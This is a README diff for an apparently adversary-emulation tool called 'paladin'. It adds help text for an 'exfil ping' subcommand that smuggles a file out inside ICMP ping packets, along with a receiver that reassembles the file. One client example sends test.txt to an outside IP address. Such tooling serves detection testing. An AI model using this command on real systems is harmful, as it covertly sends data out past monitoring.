@@ -10,7 +10,34 @@
 ### Ping Exfil
 
 The ping exfil subcommand is working and implements a basic ping exfil attack scenario.
+```
+Run ping exfil like tests on current host
 
+Usage:
+  paladin exfil ping [flags]
+  paladin exfil ping [command]
+
+Available Commands:
+  receive     Packet capture ping requests and reassemble files
+
+Flags:
+  -d, --destination string   The Destination Host of the Ping
+  -f, --file string          The name of the file to send over ping
+  -h, --help                 help for ping
+
+Use "paladin exfil ping [command] --help" for more information about a command.
+```
+#### Basic Usage
+Client
+
+```
+# paladin exfil ping -d 45.63.67.242 -f test.txt
+```
+
+Server
+```
+$ paladin exfil ping receive -i ens3
+```
 ### Atomic Red Team
 
 
